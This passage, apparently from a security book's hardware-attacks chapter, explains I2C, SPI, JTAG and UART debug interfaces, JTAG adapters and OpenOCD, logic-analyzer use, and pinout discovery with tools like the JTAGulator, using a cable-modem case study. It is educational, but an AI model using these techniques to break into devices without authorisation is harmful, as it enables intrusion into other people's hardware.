24\nC5\nHDMI:\n19 17 15 13 11 9 7 5 3 1\n14 12 10 8 6 4 2\n18 16\n+5V Data\nGround Clock\nFigure 13-4: VGA-DVI-HDMI I2C pins\nWhen you plug a new monitor into your computer and the computer reports\nthe exact make and model, this is because it received that information from the\nmonitor itself across two dedicated I2C pins in the video cable.\nEven MicroSD and SD cards transfer all their data over an SPI serial bus! That’s\nright, your memory card talks to your computer via SPI, a simple and fl exible\nc13.indd 08:24:56:AM 03/04/2014 Page 430\nChapter 13 ■ Hardware Attacks 431\nold-school serial protocol. Figure 13-5 shows the specifi c pins on the MicroSD\nand SD connectors that are involved in SPI communications.\nPin SD SPI\n1 CD/DAT3 CS\n7 8\n2 CMD DI\n3 VSS1 VSS1\n1 2 3 4 5 6\n9 4 VDD VDD\n5 CLK SCLK\nSD 6 VSS2 VSS2\n7 DAT0 DO\n8 DAT1 X\n9 DAT2 X\nPin SD SPI\n1 8\n1 DAT2 X\n2 CD/DAT3 CS\n3 CMD D1\nmicro 4 VDD VDD\nSD 5 CLK SCLK\n6 VSS VSS\n7 DAT0 DO\n8 DAT1 X\nFigure 13-5: MicroSD and SD cards use SPI\nWith these simple examples, hopefully now you’ve realized how truly ubiq-\nuitous these serial protocols are. Perhaps the most relevant example of where\nthese protocols are found is that I2C is commonly found between the application\nprocessor and the baseband processor in smartphones. In fact, by spying on\nthe communication crossing the I2C bus, George Hotz (aka GeoHot) was able\nto create the fi rst iPhone jailbreak. By spying on the I2C data destined for the\nbuilt-in power controller in MacBook batteries, Dr. Charlie Miller was able to\nreverse engineer how Apple laptop computers controlled their power sources.\nJTAG\nJTAG has become a bit of a loaded buzzword in the security world. We’ve prob-\nably all been guilty of tossing it around without understanding what it really\nmeans. This is because the concept seems so simple and familiar: It’s a way to\ndebug a chip from a separate computer. But the reality is a bit different than\nyou might think.\nc13.indd 08:24:56:AM 03/04/2014 Page 431\n432 Chapter 13 ■ Hardware Attacks\nBy now you’ve reviewed how simple serial protocols are used by integrated\ncircuits to talk to each other and peripherals. You’ve also read how these serial\ninterfaces are often used by developers to interface interactively with the operating\nsystem and boot loaders or to receive debug output from them. All this interac-\ntivity and output can be very useful, but there is another key bit of functionality\nthat an embedded developer would likely need for successful development and\ndeployment: debugging.\nUART relies on dedicated code executing on the embedded device to handle\nthe interface (that is, a shell, an interactive boot loader, and so on). How might\nan embedded developer gain visibility into what the processor is doing with-\nout anything executing on the processor — especially before the processor has\nbegun execution or while the processor is paused? On embedded systems, it\nis not merely as simple as installing a software debugger. For example, what if\nyour target is running a real-time operating system in which there is no concept\nof user-space or multiple processes? If your debug target is something like an\nRTOS (real-time operating system) or a bare-metal executable in which there is\none single executable image running, there is really only one other alternative:\nhardware debug interfaces such as JTAG.\nThe standards and specifi cations are beyond the scope of this chapter, but it is\nimportant that you know that JTAG refers to the IEEE standard 1149.1 “Standard\nTest Access Port and Boundary Scan Architecture.” This standard came into\nexistence thanks to a body called the Joint Test Action Group (JTAG) composed\nof OEMs, and developers. JTAG is named after that group and not the standard.\nThis is an important point because it sets the stage for misconceptions about\nthe technology and also its varied uses. It’s important to keep in mind that JTAG\nis a well-defi ned standard, but it does not defi ne how software debugging is\ndone. It is proof of how it is an often cited but poorly understood concept in\ndeveloper and information security communities. Once these concepts are\nproperly understood, they enable developers and researchers to debug and\nintrusively access embedded software to fi nd vulnerabilities.\nThe JTAG Myth\nPerhaps the greatest misconception about JTAG is that it is highly standard-\nized with regard to software debugging. The standard defi nes a bidirectional\ncommunication path for debugging and management. In this case, the word\n“debugging” does not have the same meaning as software people are familiar\nc13.indd 08:24:56:AM 03/04/2014 Page 432\nChapter 13 ■ Hardware Attacks 433\nwith: watching a program execute. Instead it was initially more focused on\n“debugging” in the electrical engineering context: knowing if all the chips are\npresent, checking the state of pins on various chips, and even providing basic\nlogic analyzer functionality. Embedded in the lower-level electrical engineering\ndebug functionality is the ability to support higher-level software debugging\nfunctionality. What follows is an explanation as to why this is.\nIn reality, JTAG is a more general term to describe a feature of a chip, IC, or\nmicroprocessor. With regard to fi rmware and software debugging, it is similar\nto referring to the transmission of a vehicle. The high-level concept is fairly\neasy to understand. The transmission changes the gears of the car. However,\nthe intricacies of how a car’s transmission is constructed changes with each car\nmanufacturer, which in turn matters immensely when servicing it, dismantling\nit, and interfacing with it for diagnostics.\nAs a standard, JTAG sets forth guidelines for these lower-level features and\nfunctionality as a priority but does not specify how software debugging protocol\ndata should be formed. From a software perspective, many JTAG on-chip debug-\nger (OCD) implementations do tend to work alike and provide a consistently\nminimal amount of functionality. Single stepping, breakpoints, power resets,\nwatch-points, register viewing, and boundary scanning are among the core\nfunctionality provided by most JTAG implementations. Also, the labels that\ndenote the JTAG pins in a device (for the most part) use the same notation and\nabbreviations. So even from a functional standpoint it is easy to misunderstand\nwhat exactly JTAG is.\nThe JTAG standard defi nes fi ve standard pins for communication, which you\nmay or may not see labeled on the silkscreen of a PCB or in the specifi cations\nfor chips and devices:\n■ TDO: Test Data Out\n■ TDI: Test Data In\n■ TMS: Test Mode Select\n■ TCK: Test Clock\n■ TRST: Test Reset\nFigure 13-6 shows several standard JTAG headers that are used in various\ndevices.\nThe pin names are basically self-documenting. A software person may imme-\ndiately assume that JTAG, as a standard, defi nes not only the pins but also the\ncommunication that happens across those pins. This is not so. With regard to\nc13.indd 08:24:56:AM 03/04/2014 Page 433\n434 Chapter 13 ■ Hardware Attacks\nsoftware/fi rmware debugging, the JTAG standard simply defi nes that two pins\nbe used for data transmission:\n■ TDO: Test Data Out\n■ TDI: Test Data In\n14 pin header 20 pin header\nVsup 1 2 GND Vtref 1 2 Vsup\nnTRST GND nTRST GND\nTDI GND TDI GND\nTMS GND TMS GND\nTCK GND TCK GND\nTDO nSRST RTCK GND\nVtref 13 14 GND TDO GND\nnSRST GND\nDGBRQ GND\nDGBACK 19 20 GND\nFigure 13-6: JTAG header diagram\nIt then goes on to defi ne some commands and the format of commands that\nshould be transmitted over those pins (for broader JTAG functionality) but does\nnot specify what kind of serial protocol should be used for that data. JTAG also\nspecifi es different modes for any device connected to the JTAG bus:\n■ BYPASS: Just pass data coming in on TDI to TDO\n■ EXTEST (External test): Receive command from TDI, get external pin state\ninformation, and transmit on TDO\n■ INTEST (Internal test): Get internal state information and transmit on\nTDO; also do “other” user-defi nable internal things\nFor all software/fi rmware debugging communication that happens across the\ndata pins of a JTAG interface, it is up to the vendor to implement in the user-\ndefi nable INTEST mode of JTAG communication. And indeed that’s where all\nthe software debugging stuff that we, as reverse engineers and vulnerability\nresearchers, care about is contained. All software and fi rmware debugging\nc13.indd 08:24:56:AM 03/04/2014 Page 434\nChapter 13 ■ Hardware Attacks 435\ninformation is transmitted between a chip and a debugger and is done so\nindependent of the JTAG specifi cation by making use of the “user defi nable”\nINTEST portion of JTAG specifi cation.\nAnother common misconception is that JTAG is a direct connection to a\nsingle processor or that it is specifi cally for the debugging of a single target. In\nfact, JTAG grew out of something called boundary scanning; which is a way\nto string together chips on a PCB to perform lower-level diagnostics, such as\nchecking pin states (EXTEST mentioned earlier), measuring voltages, and even\nanalyzing logic. So JTAG is fundamentally meant to connect to more than just\na single chip. Figure 13-7 shows how several chips could be connected together\nto form a JTAG bus.\nTMS\nTCK\nTMS TMS TMS\nTCK TCK TCK\nDEVICE 1 DEVICE 2 DEVICE 3\nTDI\nTDI TDO TDI TDO TDI TDO\nTDO\nFigure 13-7: Chaining on a JTAG Bus\nAs such, the JTAG specifi cation has one master and a number of slaves.\nTherefore it allows for daisy chaining multiple processors in no particular\norder. The master is often the debugger hardware (such as your PC and JTAG\ndebugger adapter) or diagnostic hardware. All the chips on the PCB are generally\nslaves. This daisy-chaining is an important thing to note for reverse engineers\nbecause often a JTAG header on a commercial product will connect you to the\ncore processor as well as to peripheral controllers, such as Bluetooth, Ethernet,\nand serial devices. Understanding this simple fact saves time and frustration\nwhen confi guring debugger tools and wading through debugger documentation.\nThe JTAG specifi cation sets no requirement for device order. Understanding\nthe fact that slaves never initiate communications makes using and examining\nJTAG devices much easier. For example, you can assume with certainty that\nyour debugger will be the only “master” in the chain. Figure 13-8 shows an\nexample of how communications paths would look with a master connected.\nc13.indd 08:24:56:AM 03/04/2014 Page 435\n436 Chapter 13 ■ Hardware Attacks\nDevice 4\nDevice 2\nc13.indd 08:24:56:AM 03/04/2014 Page 436\n3 eciveD\nTDO\nDevice 5\nTMS\nStandard\ncomputer TCK\nwith JTAG\nTRST\ninterface\nTDI\nDevice 1\nFigure 13-8: JTAG daisy-chaining\nHopefully you now see that JTAG was predominantly for electrical engineer-\ning debugging. As software developers, reverse engineers, and vulnerability\nresearchers, what we care about is debugging the software or fi rmware on a\ndevice. To that end, the JTAG specifi cation loosely designates pins and labeling\nfor use in software/fi rmware debugging. That data is transmitted with serial\nprotocols!\nThe JTAG specifi cation does not specify which serial protocol is to be used\nor the format of the debugging data transmitted. How could it if JTAG is to be\nimplemented on virtually any kind of processor? This fact is at the heart of the\nimplementation differences and indeed the core misconception about JTAG in\ndeveloper communities.\nEach JTAG implementation for fi rmware and software debugging can use\ndifferent data formats and be different even down to how it is wired. As an\nexample, Spy-Bi-Wire serial communication is the transport used in the JTAG\nimplementation for Texas Instrument’s MSP430 series of microprocessors. It\nuses only two wires where the traditional JTAG implementation might use\nfour or fi ve lines. Even though a header on a MSP430 target may be referred\nto as JTAG or have JTAG labels on the silkscreen of the PCB, the serial pins of\nthe JTAG connection use Spy-Bi-Wire. Therefore a hardware debugger needs\nto understand this pin confi guration and serial protocol to pass the data to a\nsoftware debugger. (See Figure 13-9.)\nIn Figure 13-9, you can see the traditional 14-pin JTAG header on the left, of\nwhich only two lines are used for data by the Spy-By-Wire MSP430 processor\non the right (RST/NMI/SBWTDIO and TEST/SBWTCK). In addition to the\nphysical wiring being different, sometimes the actual wire-line protocol (the\nChapter 13 ■ Hardware Attacks 437\ndebugger data fl owing across the TDO and TDI pins inside the INTEST user-\ndefi ned sections) can be different. Consequently, the debugger software that\nspeaks to the target must also be different. This gave rise to a number of dif-\nferent custom debugging cables, debugging hardware, and debugger software\nfor each individual device!\nV\ncc\nJ1 (see Note A)\nV /AV /DV\ncc cc cc\nJ2 (see Note A)\nC2 C3\n47 k\nR\nΩ\n1 10μF 0.1μF\nMSP430Fxxx\n(see Note B)\nJTAG\nVCC TOOL 2 1 TDO/TDI RST/NMI/SBWTDIO\nVCC TARGET\n4 3\n6 5\nTEST/VPP TCK\n8 7\nGND\n10 9 R2\n12 11 330 Ω\n(see Note C)\n14 13\nTEST/SBWTCK\nC1 V /AV /DV\nss ss ss\n2.2 nF\n(see Note B)\nFigure 13-9: Spy-Bi-Wire comparison\nBut don’t be intimidated! We only explain this as background information.\nWe offer it to you to help avoid the inevitable disappointment that would come\nwhen sitting down to try JTAG with the incorrect assumption that JTAG is a\nhighly standardized and universal debugging silver bullet. You need an under-\nstanding of JTAG so that you know what tools to get and why.\nJTAG Babel Fish\nFortunately, there are a handful of companies that recognized the need for\na Babel fi sh (a universal translator) to help make sense of all the different JTAG\nimplementations. Vendors like Segger, Lauterbach, and IAR have created PC-based\nsoftware and fl exible hardware devices that do all the magic translation so\nthat you can use their single devices to talk to different JTAG-enabled\nhardware devices.\nc13.indd 08:24:56:AM 03/04/2014 Page 437\n438 Chapter 13 ■ Hardware Attacks\nJTAG Adapters\nThese universal JTAG debuggers are very much like universal television remotes.\nThe vendors that create these debuggers publish long supported device lists\nthat catalog hundreds or thousands of IC/microprocessor serial numbers that\na given JTAG debugger is known to reliably support. Also much like television\nuniversal remotes; the more features, programmability, and supported devices\na debugger can support, the higher the cost. This is an important thing to keep\nin mind if you are purchasing for a specifi c project. Be sure that your target is\nsupported by the JTAG debugger you are purchasing.\nPerhaps the most popular JTAG debugger, and the one most readers will fi nd\nmore than adequate, is the Segger J-Link, shown in Figure 13-10. The relatively\nlow cost and extremely long list of supported devices makes it the go-to JTAG\ndebugger for developers. There are different models of J-Link, varying in fea-\nture sets, but the core universal debugger functionality is common to them all.\nFigure 13-10: Segger’s J-Link\nTo begin debugging, you simply plug the J-Link hardware into your com-\nputer via USB and then attach the J-Link box to your target chip via a ribbon\ncable or jumpers that you wire yourself (which is covered in the “Finding JTAG\nPinouts” section later in this chapter). The Segger software then speaks to the\nJ-Link device giving you control of the hardware device. The J-Link software\nwill even act as a GNU Debugger (GDB) server so that you can debug a chip\nfrom a more familiar GDB console! Figure 13-11 shows GDB attached to the\nSegger J-Link’s debugger server.\nc13.indd 08:24:56:AM 03/04/2014 Page 438\nChapter 13 ■ Hardware Attacks 439\nFigure 13-11: Segger J-Link and GDB screenshot\nAlthough the J-Link is the most popular debugger, there are more industrial\ndebuggers, like those made by Lauterbach, that are highly advanced and boast\nthe most device support. Lauterbach’s debuggers are pretty astounding but they\nare also prohibitively expensive.\nOpenOCD\nAnother commonly discussed JTAG solution is OpenOCD (Open On Chip\nDebugger). Unlike the previously mentioned commercial tools which bundle\nall the software and hardware you need to immediately start working with\nJTAG on a device, OpenOCD is merely an open-source piece of software. The\nmission behind OpenOCD is to support a range of JTAG adapters and target\ndevices (meaning the chip you are attempting to debug) that are then accessed\nfrom a standard GDB debugger interface (or any interface capable of talking to\na GDB server).\nc13.indd 08:24:56:AM 03/04/2014 Page 439\n440 Chapter 13 ■ Hardware Attacks\nRemember, the JTAG adapter itself handles all the signaling to the chip and\nthen translates that to a PC via a USB, serial, or parallel port connection. But\nthen a piece of software needs to speak the wire-line protocol to understand and\nparse that protocol and translate it into something a debugger can understand.\nOpenOCD is that software. In commercial solutions, both this software and the\nadapter hardware are bundled together.\nOpenOCD is commonly used with JTAG adapters that don't include software\nsuch as the Olimex adapters, the FlySwatter, the Wiggler, and even the Bus Pirate\n(which is covered for other purposes later in this chapter in the “Talking to I2C,\nSPI, and UART Devices” section). OpenOCD even works with many commercial\nJTAG adapters such as the Segger J-Link.\nIf you are well informed about a target’s pinouts, your JTAG adapter is well\nsupported, your wiring is correct and reliable, and you’ve confi gured OpenOCD\nfor all of these issues, using OpenOCD can be fairly simple. Installing it can\nbe as easy as downloading it using apt-get or other application downloaders.\nWhen you have it, you merely launch OpenOCD as a command-line tool, as\nshown in the following code:\n[s7ephen@xip ~]$ openocd\nOpen On-Chip Debugger 0.5.0-dev-00141-g33e5dd1 (2010-04-02-11:14)\nLicensed under GNU GPL v2\nFor bug reports, read\nhttp://openocd.berlios.de/doc/doxygen/bugs.html\nRCLK - adaptive\nWarn : omap3530.dsp: huge IR length 38\nRCLK - adaptive\ntrst_only separate trst_push_pull\nInfo : RCLK (adaptive clock speed) not supported - fallback to 1000 kHz\nInfo : JTAG tap: omap3530.jrc tap/device found: 0x0b7ae02f (mfg: 0x017,\npart: 0xb7ae, ver: 0x0)\nInfo : JTAG tap: omap3530.dap enabled\nInfo : omap3530.cpu: hardware has 6 breakpoints, 2 watchpoints\nThis chapter skips a bit of confi guration, such as creating/editing the main\nopenocd.cfg fi le as well as the interface, board, and target-specifi c confi gura-\ntion fi les. The devil really is in the details with OpenOCD. When it is running,\nyou can connect to OpenOCD via telnet where a command-line interface (CLI)\nis waiting:\n[s7ephen@xip ~]$ telnet localhost 4444\nTrying 127.0.0.1...\nConnected to localhost.\nEscape character is '^]'.\nOpen On-Chip Debugger\n>\nc13.indd 08:24:56:AM 03/04/2014 Page 440\nChapter 13 ■ Hardware Attacks 441\nWhen connected with OpenOCD, there is a very comfortable online help for\nthe CLI that will get you started:\n> help\nbp list or set breakpoint [<address> <length> [hw]]\ncpu <name> - prints out target options and a comment\non CPU which matches name\ndebug_level adjust debug level <0-3>\ndrscan execute DR scan <device> <num_bits> <value>\n<num_bits1> <value2> ...\ndump_image dump_image <file> <address> <size>\nexit exit telnet session\nfast fast <enable/disable> - place at beginning of\nconfig files. Sets defaults to fast and dangerous.\nfast_load loads active fast load image to current target -\nmainly for profiling purposes\nfast_load_image same args as load_image, image stored in memory -\nmainly for profiling purposes\nfind <file> - print full path to file according to\nOpenOCD search rules\nflush_count returns number of times the JTAG queue has been\nflushed\nft2232_device_desc the USB device description of the FTDI FT2232\ndevice\nft2232_latency set the FT2232 latency timer to a new value\nft2232_layout the layout of the FT2232 GPIO signals used to\ncontrol output-enables and reset signals\nft2232_serial the serial number of the FTDI FT2232 device\nft2232_vid_pid the vendor ID and product ID of the FTDI FT2232\ndevice\ngdb_breakpoint_override hard/soft/disable - force breakpoint type for gdb\n'break' commands.\ngdb_detach resume/reset/halt/nothing - specify behavior when\nGDB detaches from the target\ngdb_flash_program enable or disable flash program\ngdb_memory_map enable or disable memory map\ngdb_port daemon configuration command gdb_port\ngdb_report_data_abort enable or disable reporting data aborts\nhalt halt target\nhelp Tcl implementation of help command\ninit initializes target and servers - nop on subsequent\ninvocations\ninterface try to configure interface\ninterface_list list all built-in interfaces\nirscan execute IR scan <device> <instr> [dev2] [instr2]\nNotice the similarities between this interface and the J-Link Commander\ninterface.\nc13.indd 08:24:56:AM 03/04/2014 Page 441\n442 Chapter 13 ■ Hardware Attacks\nWhen attempting to attach a JTAG adapter to a commercial product, you\noften don’t have a standard or labeled JTAG pinout. You may also not know if\nthe JTAG port is enabled. For these reasons, deploying OpenOCD against an\nunknown or commercial target can be fraught with peril or frustration because\nyou have many independent variables such as the following:\n■ Is JTAG even active on the target device?\n■ What are the pinouts (that is, where are TDI, TDO, TCK, TRST, and TMS) ?\n■ I know the correct pinouts from the target, but are the jumpers and con-\nnectors I connected working properly?\n■ Is OpenOCD talking to the adapter properly via the right adapter driver?\n■ Is OpenOCD parsing the wire-line protocol for this target device properly\nvia the correct interface transport?\n■ This exact target device model number is similar to the target I declared in\nOpenOCD, but it is not an exact match. Does that matter for this to work?\nFor all these reasons, using a commercial JTAG interface (like the Segger) with\na clearly specifi ed supported adapter list can save a lot of time and heartache.\nBecause commercial JTAG interfaces come bundled with all the supporting\nsoftware, the process is much smoother. Should you choose (or be required) to\nuse OpenOCD, the next best thing to try is to obtain an evaluation kit for the\nchip that you are targeting.\nEvaluation Kits\nEvaluation kits are the standard way that engineers and designers fi nd the right\nproducts for their systems. Virtually every commercial processor and controller\nwill have an evaluation kit created by the manufacturer. They are often very low\ncost, ranging from free to $300 (many are about $100). In general, it behooves\nmanufacturers to make evaluation kits cheap and accessible for people that\nmight be developing products that use their processors.\nSome manufacturers even go so far so to provide reference designs that\nbundle the Gerber fi les (the 3D model and wiring specifi cations) of the evalua-\ntion kits themselves along with the Bill Of Materials (BOMs) so that embedded\nengineers can quickly manufacture their own products without building a\nwhole PCB around the processor from scratch. In this way, evaluation kits can\nalso be immensely useful to reverse engineers and vulnerability researchers.\nFigure 13-12 shows the STMicro ARM development kit.\nThe primary way that these evaluation kits are useful to reverse engineers is\nwith regard to debuggers. The evaluation boards contain all that is needed for\na developer to debug, program, and interface with a processor. They may also\nprovide any specifi cations about security features of the processor that might’ve\nbeen employed by the manufacturer to protect the product.\nc13.indd 08:24:56:AM 03/04/2014 Page 442\nChapter 13 ■ Hardware Attacks 443\nFigure 13-12: STMicro ARM development kit\nYou can use the evaluation kits as a control environment to test your debug-\nging setup with software like OpenOCD. By building this kind of control envi-\nronment you can test your debugger setup under ideal conditions to eliminate\nsome of the independent variables discussed earlier. Having eliminated those,\nyou can be confi dent that your debugger setup should work if your wiring is\ncorrect (to the target) and the device has JTAG enabled.\nFinally Connected\nAfter you have a debugger device connected to your target chip, either by a\nprogramming header or hand-wired connections, the debugger software notifi es\nyou that the debugger device is successfully connected to the target. In the case\nof the Segger J-Link, you can begin using GDB against the target immediately\nas shown in Figure 13-13.\nFinding Debug Interfaces\nNow that you have had an overview of the kinds of interfaces you might encoun-\nter (and how they work), you need to know what to do when you suspect you’ve\nfound one. How do you know which pins do what? How do you get those pins\nc13.indd 08:24:56:AM 03/04/2014 Page 443\n444 Chapter 13 ■ Hardware Attacks\nconnected to your tools? There are a number of tricks and tools that you may\ndeploy to assist with making determinations about protocols and formatting.\nFigure 13-13: J-Link debugging the STM32 ARM devkit\nThis section lists several simple tools that you can use to identify and talk to\nall the interfaces we’ve discussed so far in this chapter (JTAG, I2C, SPI, UART,\nand so on). Later sections of this chapter discuss how you can connect and\ninterface with these tools in more detail.\nEnter the Logic Analyzer\nPerhaps the most useful tool for determining what a pin is used for is a logic\nanalyzer. These devices have a rather intimidating name, especially for software\npeople, but in reality they are very simple. These devices just show you what\nis happening on a pin. You connect a probe from the device and if there is data\nbeing transmitted on a pin it shows you the square wave of that data and even\nattempts to decode it for you using a number of different fi lters.\nTraditional logic analyzers were a bit more complex, but new generations\nof them connect to computer-based applications that eliminate the esoteric\nnature of these devices. These kinds of logic analyzers themselves have no user\ninterface on the device itself and instead are controlled entirely by user-friendly\nc13.indd 08:24:56:AM 03/04/2014 Page 444\nChapter 13 ■ Hardware Attacks 445\nand intuitive computer-based applications. One such device is the Saleae Logic\nAnalyzer, shown in Figure 13-14.\nFigure 13-14: Saleae Logic Analyzer\nUsing the Saleae, you can connect the color-coded electrodes to pins on your\ntarget device, which enables using the software application (that receives data\nfrom the Saleae via USB) to capture activity. The results are displayed in the\ninterface corresponding to the color of the pins of the electrodes, as shown in\nFigure 13-15.\nFigure 13-15: Saleae Logic Analyzer in action\nc13.indd 08:24:56:AM 03/04/2014 Page 445\n446 Chapter 13 ■ Hardware Attacks\nAs if this was not useful enough for the layperson, Saleae included a bunch\nof other useful functionality in the application. For example, fi lters attempt to\ndecode a captured data stream as a bunch of different types such as I2C, SPI,\nand asynchronous serial (UART) at varying baud rates. It will even attempt\nto identify baud rates automatically. Figure 13-16 shows the fi lters commonly\nsupported by the Saleae software.\nFigure 13-16: Saleae Logic Analyzer filters\nThese fi lters act much like Wireshark’s protocol dissectors, allowing you to\nquickly view the captured data as if it were being parsed as different formats.\nThe Saleae interface even overlays the byte encoding on the square wave form\nin the interface, as shown in Figure 13-17.\nFigure 13-17: Saleae Logic Analyzer byte display\nFrom this, you can generally immediately identify a UART signal (if not by\nthe fi lters then by eye) as most UART connections are used for transmission of\nASCII text.\nc13.indd 08:24:56:AM 03/04/2014 Page 446\nChapter 13 ■ Hardware Attacks 447\nLastly, Saleae exports this decoded data as a binary fi le (for you to parse\nyourself) or as a comma-separated value (CSV) fi le with some metadata included\n(such as timing, pin number, etc.). This is very useful for further analysis or\nlogging purposes.\nFinding UART Pinouts\nFinding UART pinouts is crucial, as UART is often used as a means to transmit\ndebug output or to provide shells or other interactive consoles to a developer.\nMany production-grade products go to market not only with these interfaces\nactive, but with the pins overtly exposed. In 2010 and 2011, Stephen A. Ridley\nand Rajendra Umadras demonstrated this fact in a series of talks in which\nthey discussed a specifi c brand of cable modem being distributed by the home\nInternet service providers in the New York City metropolitan area. This series\nof home cable modems used a Broadcom BCM3349 series chip (specifi cally the\nBCM3349KPB) for which the four UART pins were exposed on the PCB in the\nsmall four-pin header shown in Figure 13-18.\nFigure 13-18: Broadcom BCM3349 4-pin header\nIn this case, there was little knowledge about what the pins on that header\nwere or what they were responsible for. As a precautionary measure, a voltmeter\nwas fi rst connected to those pins as shown in Figure 13-19.\nc13.indd 08:24:56:AM 03/04/2014 Page 447\n448 Chapter 13 ■ Hardware Attacks\nFigure 13-19: Broadcom BCM3349 voltage test\nThis was done to be sure that they didn’t carry a voltage that would burn the\nanalysis equipment. Additionally, the pin that carried no voltage would likely\nbe the ground pin.\nThe presence of 3.3 volts, as shown in Figure 13-19, generally (but not always)\nimplies that the target pin is used for data as most supply voltages (or lines used\nexclusively to power devices and not transmit data) are around 5 volts. This was\na fi rst indication that these pins might have serial data.\nNext, the Saleae was connected to each pin, with each electrode connected\nto the pin in question. In the Saleae user interface, the color of each graph area\ncorresponds directly to the color of each electrode on the physical device, which\nmakes referencing it very simple. Recording data from the Saleae was started\nwhile power cycling the cable modem. The prevailing assumption was that the\ncable modem would likely output data during its boot sequence as the device\npowered on. After several recordings of boot sequences, the square waves shown\nin Figure 13-20 were observed on the pins.\nThe regularity of the square wave on Input 3 (which was red) indicated that\nthe pin that the red electrode was connected to was likely a clock pin. Clock pin\nsignals generally accompany data signals. They are the metronome to which\nthe sheet music of data is played. They are important for the recipient to know\nthe timing of the data it is receiving. The regularity of that square wave and\nsubsequent irregularity of the adjacent input (Input 4) indicate that both a clock\nand data pin have both been observed simultaneously.\nUsing the Saleae functionality further, this hypothesis was tested by running\nthe captured square waves through some of the built-in fi lters or analyzers.\nAfter this Analyzer has run, it overlays the suspected byte values for each\ncorresponding section of the square wave, depicted in Figure 13-21. It will also\ndisplay the suspected baud rate.\nc13.indd 08:24:56:AM 03/04/2014 Page 448\nChapter 13 ■ Hardware Attacks 449\nFigure 13-20: Broadcom BCM3349 Saleae pin test\nFigure 13-21: Broadcom BCM3349 Saleae Bytes\nThis data was output to the computer’s fi le system as CSV data and then\ncleansed using a simple python script like the following:\n#!/usr/bin/env python\nimport csv\nreader = csv.reader(open(\"BCM3349_capture.csv\", \"rb\"))\nthang = \"\"\nfor row in reader:\nthang = thang+row[1]\nc13.indd 08:24:56:AM 03/04/2014 Page 449\n450 Chapter 13 ■ Hardware Attacks\nthang = thang.replace(\"\\\\r\", \"\\x0d\")\nthang = thang.replace(\"\\\\n\", \"\\x0a\") #clean up Windows CR/LF\nthang = thang.replace(\"''\",\"\") #Cleanse Saleae CSV output quotes\n#print thang\nimport pdb;pdb.set_trace() # drop into an \"in scope\" Python interpreter\nExecuting this Python script enables you to view the CSV data and manipulate\nit interactively from a familiar Python shell. Printing the variable thang yielded\nthe output shown in Figure 13-22.\nAs you can see, the data captured across those overt pins is in fact boot\nmessages from the device. The device goes on to boot a real-time operating\nsystem called eCos. The researchers that presented this technique went on to\nexplain that the cable modem was also running an embedded webserver that\nthey fuzzed. Stack-traces of the crashes caused by fuzzing were printed on the\nUART serial port shown in Figure 13-23. This information assisted in exploita-\ntion of the device.\nFigure 13-22: Broadcom BCM3349 bootloader\nc13.indd 08:24:56:AM 03/04/2014 Page 450\nChapter 13 ■ Hardware Attacks 451\nFigure 13-23: Broadcom BCM3349 crash\nFinding SPI and I2C Pinouts\nThe process of fi nding SPI and I2C devices is similar to that of fi nding UART.\nHowever, SPI and I2C are generally used locally on the PCB to pass data between\nchips. As such, their functionality and usability can make them a bit differ-\nent to identify. However, they will occasionally leave the PCB and be used for\nperipherals (often proprietary). The canonical example of this is the Nintendo\nWii controllers and other game consoles that often use SPI as a way to connect\nto the main game console for wired connections. The pinout for this connector\nis shown in Figure 13-24.\nClock GND\n3.3V Data\nFigure 13-24: Wii nunchuck pinout\nThe data transmitted on these SPI pins varies based on how the manufacturer\nof the device (or controller) chooses to format it. In this way, the data across an\nc13.indd 08:24:56:AM 03/04/2014 Page 451\n452 Chapter 13 ■ Hardware Attacks\nI2C or SPI bus is specifi c to whatever you are attempting to target. Read more\non how to spy on these busses in the following sections.\nFinding JTAG Pinouts\nFinding JTAG pinouts can be daunting. As described in great detail earlier,\nthe pinouts for JTAG Serial Wire Debugging (SWD) depend on the manufac-\nturer of the target device. Looking at standard JTAG headers, like those used\nin development kits and evaluation kits, it is clear that there can be many pin\nconfi gurations. Figure 13-25 shows the most common headers.\nIf there are so many possibilities in controlled environments like these, then\nwhat can you expect from devices in the wild?\nThankfully, as mentioned earlier, the reality is that for JTAG SWD there are\nonly a few pins that are actually needed to perform basic debugger functional-\nity. Again, those pins are the following:\n■ TDO: Test Data Out\n■ TDI: Test Data In\n■ TMS: Test Mode Select\n■ TCK: Test Clock\n■ TRST: Test Reset\nARM 10-PIN Interface ST 14-PIN Interface OCDS 16-PIN Interface ARM 20-PIN Interface\n/JEN 1 2 /TRST TMS 1 2 VCC (optional) VCC 1 2 VCC (optional)\nVCC 1 2 TMS GND 3 4 N/C TDO 3 4 GND TRST 3 4 GND\nGND 3 4 TCLK TDI 5 6 TSTAT CPUCLK 5 6 GND TDI 5 6 GND\nGND 5 6 TDO VCC 7 8 /RST TDI 7 8 RESET TMS 7 8 GND\nRTCK 7 8 TDI TMS 9 10GND TRST 9 10BRKOUT TCLK 9 10GND\nGND 9 10RESET TCLK11 12GND TCLK11 12GND RTCK11 12GND\nTDO13 14 /TERR BRKIN13 14OCDSE TDO13 14GND\nTRAP15 16GND RESET15 16GND\nN/C17 18GND\nN/C19 20GND\nFigure 13-25: Common JTAG header pinouts\nIn reality, even TRST is optional as it’s only used to reset the target device.\nWhen approaching a new device, fi guring out which pins from a block of\nunlabeled pinouts is merely a guessing game. There are some heuristics reverse\nengineers could apply to fi nd pins like the clock pin. A regular square wave, like\nthose we discussed in the section “Finding UART Pinouts,” would reveal that\nthis was TCK. However, this process can be very time consuming to perform\nmanually, taking days, if not weeks, depending on the target. This is due to the\nneed to try such a large number of possible combinations.\nc13.indd 08:24:56:AM 03/04/2014 Page 452\nChapter 13 ■ Hardware Attacks 453\nRecently, however, hacker/reverse engineer/developer Joe Grand created an\nopen source hardware device called the JTAGulator. It allows a reverse engineer\nto easily iterate through all possible pinouts and thusly brute-force JTAG pinouts\nblindly! The schematics, bill of materials (BOM), and fi rmware required for cre-\nating your own device are completely open and downloadable from Joe Grand’s\nwebsite at www.grandideastudio.com/portfolio/jtagulator. Further, you can\npurchase fully assembled and operational units, such as the JTAGulator shown\nin Figure 13-26 from the Parallax website at www.parallax.com/product/32115.\nInput protection\nTarget I/F (24 channels) Level translation Status\nPropeller Op-Amp/DAC USB\nFigure 13-26: JTAGulator\nWith the JTAGulator, you fi rst connect all the questionable pins to screw-\ndown terminals or headers on the JTAGulator. Make sure that at least one pin\nfrom the target’s ground plane connects the ground (GND) on the JTAGulator.\nThe JTAGulator is USB bus powered. Connecting to the device is simple using\na standard terminal program like PuTTY, GNU Screen, or Minicom.\n[s7ephen@xip ~]$ ls /dev/*serial*\n/dev/cu.usbserial-A901KKFM 